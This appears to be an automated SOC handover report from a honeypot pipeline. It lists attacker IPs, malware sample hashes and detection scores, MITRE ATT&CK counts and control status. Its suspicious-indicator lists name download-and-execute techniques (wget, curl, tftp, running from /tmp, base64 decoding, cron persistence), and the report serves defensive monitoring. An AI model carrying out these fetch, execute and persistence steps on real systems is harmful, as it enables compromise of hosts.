| `45.205.1[.]247` | 1 | 2026-07-28 15:54 | 2026-07-28 15:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-07-28 13:50 | 2026-07-28 13:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-28 16:10 | 2026-07-28 16:12 | 73s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-28 15:34 | 2026-07-28 15:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]232` | 1 | 2026-07-28 12:58 | 2026-07-28 12:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]190` | 1 | 2026-07-28 12:55 | 2026-07-28 12:55 | 17s | 0 | `T1592` | 🟢 LOW |
| `78.25.5[.]164` | 1 | 2026-07-28 16:01 | 2026-07-28 16:01 | 12s | 0 | `T1592` | 🟢 LOW |
| `83.239.108[.]218` | 1 | 2026-07-28 13:35 | 2026-07-28 13:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `96.56.204[.]139` | 1 | 2026-07-28 16:49 | 2026-07-28 16:49 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.153[.]19` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 48 |
| `1.247.245[.]61` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `163.177.76[.]83` | CN | China Unicom Guangdong province network | **100** ⚠️ | 5 |
| `116.177.172[.]64` | CN | China United Network Communications Corporation Limited | **100** ⚠️ | 50 |
| `66.132.195[.]41` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `118.183.180[.]108` | CN | CHINANET Gansu province network | **100** ⚠️ | 50 |
| `116.181.16[.]138` | CN | China United Network Communications Corporation Limited | **100** ⚠️ | 4 |
| `39.104.64[.]139` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `111.70.17[.]73` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 49 |
| `213.130.207[.]177` | LT | Mobile Services Lithuania | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 258 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 245 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 140 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 138 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 134 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 386 cases |
| Tool 34  | Credential Extractor        | ✅ 284 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 128 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (6.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 91 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 245 priority case(s) shown individually · 41 recon entry/entries in table (17 group(s) consolidating 92 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-28T17:39:34Z_
